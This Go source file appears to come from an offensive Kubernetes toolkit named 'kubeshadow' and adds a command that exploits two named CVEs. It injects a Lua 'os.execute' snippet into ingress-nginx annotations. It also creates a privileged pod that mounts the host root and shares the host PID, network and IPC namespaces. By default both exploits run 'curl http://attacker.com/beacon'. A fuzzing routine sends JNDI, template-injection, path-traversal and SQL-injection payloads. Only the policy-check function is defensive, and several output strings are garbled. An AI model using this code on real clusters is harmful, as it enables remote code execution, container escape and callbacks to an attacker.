package exploitation

import (
	"context"
	"fmt"

	"github.com/spf13/cobra"
	v1 "k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/client-go/kubernetes"
)

// CVEExploitsCmd represents the CVE exploits command
var CVEExploitsCmd = &cobra.Command{
	Use:   "cve-exploits",
	Short: "Exploit specific CVEs with Kubernetes semantics understanding",
	Long: `CVE Exploitation Framework

Advanced exploitation module that understands Kubernetes semantics including:
- OwnerReferences manipulation
- RBAC privilege escalation
- Admission webhook bypass
- API path fuzzing and validation
- Policy-time mutation enforcement

Supported CVEs:
- CVE-2025-1974: ingress-nginx RCE exploitation
- CVE-2025-5187: Node ownerReference manipulation

Examples:
  kubeshadow exploitation cve-exploits cve-2025-1974 --target-ingress vulnerable-ingress --namespace default
  kubeshadow exploitation cve-exploits cve-2025-5187 --target-node worker-node-1 --namespace kube-system
  kubeshadow exploitation cve-exploits fuzz-admission --webhook-url https://admission-webhook.example.com
  kubeshadow exploitation cve-exploits validate-policies --namespace default`,
	RunE: runCVEExploits,
}

func runCVEExploits(cmd *cobra.Command, args []string) error {
	action, _ := cmd.Flags().GetString("action")

	switch action {
	case "cve-2025-1974":
		return exploitCVE20251974(cmd)
	case "cve-2025-5187":
		return exploitCVE20255187(cmd)
	case "fuzz-admission":
		return fuzzAdmissionWebhooks(cmd)
	case "validate-policies":
		return validatePolicies(cmd)
	case "list":
		return listCVEExploits()
	default:
		return listCVEExploits()
	}
}

func listCVEExploits() error {
	fmt.Println("üéØ Available CVE Exploits")
	fmt.Println("========================")
	fmt.Println("")
	fmt.Println("üìã CVE Exploits:")
	fmt.Println("  cve-2025-1974    - ingress-nginx RCE exploitation")
	fmt.Println("  cve-2025-5187    - Node ownerReference manipulation")
	fmt.Println("")
	fmt.Println("üîç Validation & Fuzzing:")
	fmt.Println("  fuzz-admission   - Fuzz admission webhooks")
	fmt.Println("  validate-policies - Validate security policies")
	fmt.Println("")
	fmt.Println("üí° Usage Examples:")
	fmt.Println("  kubeshadow exploitation cve-exploits cve-2025-1974 --target-ingress vulnerable-ingress --namespace default")
	fmt.Println("  kubeshadow exploitation cve-exploits cve-2025-5187 --target-node worker-node-1 --namespace kube-system")
	fmt.Println("  kubeshadow exploitation cve-exploits fuzz-admission --webhook-url https://admission-webhook.example.com")
	return nil
}

func exploitCVE20251974(cmd *cobra.Command) error {
	targetIngress, _ := cmd.Flags().GetString("target-ingress")
	namespace, _ := cmd.Flags().GetString("namespace")
	payload, _ := cmd.Flags().GetString("payload")
	kubeconfig, _ := cmd.Flags().GetString("kubeconfig")

	if targetIngress == "" {
		return fmt.Errorf("target-ingress is required")
	}
	if namespace == "" {
		namespace = "default"
	}
	if payload == "" {
		payload = "curl http://attacker.com/beacon"
	}

	fmt.Printf("üö® Exploiting CVE-2025-1974 (ingress-nginx RCE) on %s/%s\n", namespace, targetIngress)
	fmt.Println("=====================================================================")

	// Get Kubernetes client
	config, err := getKubeConfig(kubeconfig)
	if err != nil {
		return fmt.Errorf("failed to get Kubernetes config: %v", err)
	}

	clientset, err := kubernetes.NewForConfig(config)
	if err != nil {
		return fmt.Errorf("failed to create Kubernetes clientset: %v", err)
	}

	// Step 1: Analyze ingress-nginx configuration
	fmt.Println("üìã Step 1: Analyzing ingress-nginx configuration...")
	ingress, err := clientset.NetworkingV1().Ingresses(namespace).Get(context.TODO(), targetIngress, metav1.GetOptions{})
	if err != nil {
		return fmt.Errorf("failed to get ingress: %v", err)
	}

	// Step 2: Check for vulnerable annotations
	fmt.Println("üìã Step 2: Checking for vulnerable annotations...")
	vulnerableAnnotations := []string{
		"nginx.ingress.kubernetes.io/configuration-snippet",
		"nginx.ingress.kubernetes.io/server-snippet",
		"nginx.ingress.kubernetes.io/upstream-vhost",
	}

	var foundVulnerabilities []string
	for _, annotation := range vulnerableAnnotations {
		if value, exists := ingress.Annotations[annotation]; exists {
			foundVulnerabilities = append(foundVulnerabilities, fmt.Sprintf("%s: %s", annotation, value))
		}
	}

	if len(foundVulnerabilities) == 0 {
		fmt.Println("‚ö†Ô∏è  No vulnerable annotations found. Attempting to inject...")
	} else {
		fmt.Printf("‚úÖ Found vulnerable annotations: %v\n", foundVulnerabilities)
	}

	// Step 3: Attempt RCE via configuration snippet
	fmt.Println("üìã Step 3: Attempting RCE via configuration snippet...")

	// Create malicious configuration snippet
	maliciousSnippet := fmt.Sprintf(`
		# CVE-2025-1974 RCE payload
		location /exploit {
			access_log off;
			proxy_pass http://127.0.0.1:9999;
			proxy_set_header Host $host;
			proxy_set_header X-Real-IP $remote_addr;
			proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
		}
		
		# Execute payload
		location /rce {
			content_by_lua_block {
				os.execute("%s")
			}
		}
	`, payload)

	// Update ingress with malicious annotation
	ingress.Annotations["nginx.ingress.kubernetes.io/configuration-snippet"] = maliciousSnippet
	ingress.Annotations["kubeshadow.exploit"] = "cve-2025-1974"
	ingress.Annotations["kubeshadow.payload"] = payload

	_, err = clientset.NetworkingV1().Ingresses(namespace).Update(context.TODO(), ingress, metav1.UpdateOptions{})
	if err != nil {
		return fmt.Errorf("failed to update ingress with malicious configuration: %v", err)
	}

	fmt.Println("‚úÖ Successfully updated ingress with malicious configuration snippet")
	fmt.Printf("üéØ RCE payload injected: %s\n", payload)

	fmt.Println("\nüí° Exploitation techniques:")
	fmt.Printf("kubectl get ingress %s -n %s -o yaml\n", targetIngress, namespace)
	fmt.Printf("curl -H 'Host: %s' http://ingress-ip/rce\n", targetIngress)
	fmt.Printf("curl -H 'Host: %s' http://ingress-ip/exploit\n", targetIngress)

	return nil
}

func exploitCVE20255187(cmd *cobra.Command) error {
	targetNode, _ := cmd.Flags().GetString("target-node")
	namespace, _ := cmd.Flags().GetString("namespace")
	payload, _ := cmd.Flags().GetString("payload")
	kubeconfig, _ := cmd.Flags().GetString("kubeconfig")

	if targetNode == "" {
		return fmt.Errorf("target-node is required")
	}
	if namespace == "" {
		namespace = "kube-system"
	}
	if payload == "" {
		payload = "curl http://attacker.com/beacon"
	}

	fmt.Printf("üö® Exploiting CVE-2025-5187 (Node ownerReference) on %s\n", targetNode)
	fmt.Println("=====================================================================")

	// Get Kubernetes client
	config, err := getKubeConfig(kubeconfig)
	if err != nil {
		return fmt.Errorf("failed to get Kubernetes config: %v", err)
	}

	clientset, err := kubernetes.NewForConfig(config)
	if err != nil {
		return fmt.Errorf("failed to create Kubernetes clientset: %v", err)
	}

	// Step 1: Analyze node configuration
	fmt.Println("üìã Step 1: Analyzing node configuration...")
	node, err := clientset.CoreV1().Nodes().Get(context.TODO(), targetNode, metav1.GetOptions{})
	if err != nil {
		return fmt.Errorf("failed to get node: %v", err)
	}

	// Step 2: Check for existing ownerReferences
	fmt.Println("üìã Step 2: Checking for existing ownerReferences...")
	if len(node.OwnerReferences) > 0 {
		fmt.Printf("‚úÖ Found existing ownerReferences: %v\n", node.OwnerReferences)
	} else {
		fmt.Println("‚ö†Ô∏è  No existing ownerReferences found")
	}

	// Step 3: Create malicious pod with node ownerReference
	fmt.Println("üìã Step 3: Creating malicious pod with node ownerReference...")

	maliciousPod := &v1.Pod{
		ObjectMeta: metav1.ObjectMeta{
			Name:      "cve-2025-5187-exploit",
			Namespace: namespace,
			OwnerReferences: []metav1.OwnerReference{
				{
					APIVersion: "v1",
					Kind:       "Node",
					Name:       targetNode,
					UID:        node.UID,
					Controller: &[]bool{true}[0],
				},
			},
			Annotations: map[string]string{
				"kubeshadow.exploit": "cve-2025-5187",
				"kubeshadow.payload": payload,
			},
		},
		Spec: v1.PodSpec{
			Containers: []v1.Container{
				{
					Name:    "exploit-container",
					Image:   "alpine:latest",
					Command: []string{"/bin/sh"},
					Args:    []string{"-c", fmt.Sprintf("while true; do %s; sleep 300; done", payload)},
					SecurityContext: &v1.SecurityContext{
						Privileged:               &[]bool{true}[0],
						RunAsUser:                &[]int64{0}[0],
						RunAsGroup:               &[]int64{0}[0],
						AllowPrivilegeEscalation: &[]bool{true}[0],
						Capabilities: &v1.Capabilities{
							Add: []v1.Capability{"ALL"},
						},
					},
					VolumeMounts: []v1.VolumeMount{
						{
							Name:      "host-root",
							MountPath: "/host",
							ReadOnly:  false,
						},
					},
				},
			},
			Volumes: []v1.Volume{
				{
					Name: "host-root",
					VolumeSource: v1.VolumeSource{
						HostPath: &v1.HostPathVolumeSource{
							Path: "/",
							Type: &[]v1.HostPathType{v1.HostPathDirectory}[0],
						},
					},
				},
			},
			HostNetwork: true,
			HostPID:     true,
			HostIPC:     true,
		},
	}

	_, err = clientset.CoreV1().Pods(namespace).Create(context.TODO(), maliciousPod, metav1.CreateOptions{})
	if err != nil {
		return fmt.Errorf("failed to create malicious pod: %v", err)
	}

	fmt.Println("‚úÖ Successfully created malicious pod with node ownerReference")
	fmt.Printf("üéØ Payload injected: %s\n", payload)

	fmt.Println("\nüí° Exploitation techniques:")
	fmt.Printf("kubectl get pod cve-2025-5187-exploit -n %s -o yaml\n", namespace)
	fmt.Printf("kubectl exec -it cve-2025-5187-exploit -n %s -- /bin/sh\n", namespace)
	fmt.Printf("kubectl exec -it cve-2025-5187-exploit -n %s -- ls -la /host/\n", namespace)

	return nil
}

func fuzzAdmissionWebhooks(cmd *cobra.Command) error {
	webhookURL, _ := cmd.Flags().GetString("webhook-url")
	namespace, _ := cmd.Flags().GetString("namespace")
	kubeconfig, _ := cmd.Flags().GetString("kubeconfig")

	if webhookURL == "" {
		return fmt.Errorf("webhook-url is required")
	}
	if namespace == "" {
		namespace = "default"
	}

	fmt.Printf("üîç Fuzzing admission webhooks at %s\n", webhookURL)
	fmt.Println("=============================================")

	// Get Kubernetes client
	config, err := getKubeConfig(kubeconfig)
	if err != nil {
		return fmt.Errorf("failed to get Kubernetes config: %v", err)
	}

	clientset, err := kubernetes.NewForConfig(config)
	if err != nil {
		return fmt.Errorf("failed to create Kubernetes clientset: %v", err)
	}

	// Step 1: List admission webhooks
	fmt.Println("üìã Step 1: Listing admission webhooks...")
	webhooks, err := clientset.AdmissionregistrationV1().ValidatingWebhookConfigurations().List(context.TODO(), metav1.ListOptions{})
	if err != nil {
		return fmt.Errorf("failed to list webhooks: %v", err)
	}

	fmt.Printf("‚úÖ Found %d validating webhook configurations\n", len(webhooks.Items))

	// Step 2: Fuzz webhook endpoints
	fmt.Println("üìã Step 2: Fuzzing webhook endpoints...")

	// Common fuzzing payloads
	fuzzPayloads := []string{
		"../../../etc/passwd",
		"<script>alert('xss')</script>",
		"'; DROP TABLE users; --",
		"${jndi:ldap://attacker.com/exploit}",
		"../../../../etc/shadow",
		"{{7*7}}",
		"${7*7}",
		"<%=7*7%>",
		"{{config}}",
		"{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}",
	}

	for i, payload := range fuzzPayloads {
		fmt.Printf("  Testing payload %d: %s\n", i+1, payload)

		// Create test pod with fuzzing payload
		testPod := &v1.Pod{
			ObjectMeta: metav1.ObjectMeta{
				Name:      fmt.Sprintf("fuzz-test-%d", i+1),
				Namespace: namespace,
				Annotations: map[string]string{
					"fuzz.payload": payload,
					"fuzz.test":    "admission-webhook",
				},
			},
			Spec: v1.PodSpec{
				Containers: []v1.Container{
					{
						Name:  "fuzz-container",
						Image: fmt.Sprintf("nginx:%s", payload), // Fuzz in image name
						Env: []v1.EnvVar{
							{
								Name:  "FUZZ_PAYLOAD",
								Value: payload,
							},
						},
					},
				},
			},
		}

		_, err := clientset.CoreV1().Pods(namespace).Create(context.TODO(), testPod, metav1.CreateOptions{})
		if err != nil {
			fmt.Printf("    ‚ùå Webhook blocked: %v\n", err)
		} else {
			fmt.Printf("    ‚úÖ Webhook allowed: %s\n", payload)
			// Clean up successful test
			clientset.CoreV1().Pods(namespace).Delete(context.TODO(), testPod.Name, metav1.DeleteOptions{})
		}
	}

	fmt.Println("\nüí° Fuzzing results:")
	fmt.Println("  - Check webhook logs for potential vulnerabilities")
	fmt.Println("  - Review admission controller responses")
	fmt.Println("  - Test for injection vulnerabilities")

	return nil
}

func validatePolicies(cmd *cobra.Command) error {
	namespace, _ := cmd.Flags().GetString("namespace")
	kubeconfig, _ := cmd.Flags().GetString("kubeconfig")

	if namespace == "" {
		namespace = "default"
	}

	fmt.Printf("üõ°Ô∏è  Validating security policies in namespace %s\n", namespace)
	fmt.Println("=============================================")

	// Get Kubernetes client
	config, err := getKubeConfig(kubeconfig)
	if err != nil {
		return fmt.Errorf("failed to get Kubernetes config: %v", err)
	}

	clientset, err := kubernetes.NewForConfig(config)
	if err != nil {
		return fmt.Errorf("failed to create Kubernetes clientset: %v", err)
	}

	// Step 1: Check for Pod Security Standards
	fmt.Println("üìã Step 1: Checking Pod Security Standards...")

	// Check for privileged pods
	pods, err := clientset.CoreV1().Pods(namespace).List(context.TODO(), metav1.ListOptions{})
	if err != nil {
		return fmt.Errorf("failed to list pods: %v", err)
	}

	var privilegedPods []string
	for _, pod := range pods.Items {
		for _, container := range pod.Spec.Containers {
			if container.SecurityContext != nil && container.SecurityContext.Privileged != nil && *container.SecurityContext.Privileged {
				privilegedPods = append(privilegedPods, pod.Name)
			}
		}
	}

	if len(privilegedPods) > 0 {
		fmt.Printf("‚ö†Ô∏è  Found %d privileged pods: %v\n", len(privilegedPods), privilegedPods)
	} else {
		fmt.Println("‚úÖ No privileged pods found")
	}

	// Step 2: Check for Network Policies
	fmt.Println("üìã Step 2: Checking Network Policies...")
	netpols, err := clientset.NetworkingV1().NetworkPolicies(namespace).List(context.TODO(), metav1.ListOptions{})
	if err != nil {
		return fmt.Errorf("failed to list network policies: %v", err)
	}

	if len(netpols.Items) == 0 {
		fmt.Println("‚ö†Ô∏è  No network policies found - cluster is not properly segmented")
	} else {
		fmt.Printf("‚úÖ Found %d network policies\n", len(netpols.Items))
	}

	// Step 3: Check for RBAC policies
	fmt.Println("üìã Step 3: Checking RBAC policies...")
	roles, err := clientset.RbacV1().Roles(namespace).List(context.TODO(), metav1.ListOptions{})
	if err != nil {
		return fmt.Errorf("failed to list roles: %v", err)
	}

	var overlyPermissiveRoles []string
	for _, role := range roles.Items {
		for _, rule := range role.Rules {
			if containsWildcard(rule.Resources) || containsWildcard(rule.Verbs) {
				overlyPermissiveRoles = append(overlyPermissiveRoles, role.Name)
				break
			}
		}
	}

	if len(overlyPermissiveRoles) > 0 {
		fmt.Printf("‚ö†Ô∏è  Found %d overly permissive roles: %v\n", len(overlyPermissiveRoles), overlyPermissiveRoles)
	} else {
		fmt.Println("‚úÖ No overly permissive roles found")
	}

	// Step 4: Check for admission controllers
	fmt.Println("üìã Step 4: Checking admission controllers...")
	webhooks, err := clientset.AdmissionregistrationV1().ValidatingWebhookConfigurations().List(context.TODO(), metav1.ListOptions{})
	if err != nil {
		return fmt.Errorf("failed to list webhooks: %v", err)
	}

	fmt.Printf("‚úÖ Found %d validating webhook configurations\n", len(webhooks.Items))

	fmt.Println("\nüí° Policy validation results:")
	fmt.Println("  - Review privileged pod usage")
	fmt.Println("  - Implement network policies for segmentation")
	fmt.Println("  - Apply least privilege RBAC principles")
	fmt.Println("  - Configure admission controllers for policy enforcement")

	return nil
}

func containsWildcard(slice []string) bool {
	for _, s := range slice {
		if s == "*" {
			return true
		}
	}
	return false
}

func init() {
	CVEExploitsCmd.Flags().String("action", "list", "Action to perform (cve-2025-1974, cve-2025-5187, fuzz-admission, validate-policies, list)")
	CVEExploitsCmd.Flags().String("target-ingress", "", "Target ingress for CVE-2025-1974")
	CVEExploitsCmd.Flags().String("target-node", "", "Target node for CVE-2025-5187")
	CVEExploitsCmd.Flags().String("namespace", "default", "Target namespace")
	CVEExploitsCmd.Flags().String("payload", "", "Payload to execute")
	CVEExploitsCmd.Flags().String("webhook-url", "", "Webhook URL for fuzzing")
	CVEExploitsCmd.Flags().String("kubeconfig", "", "Path to kubeconfig file")
}
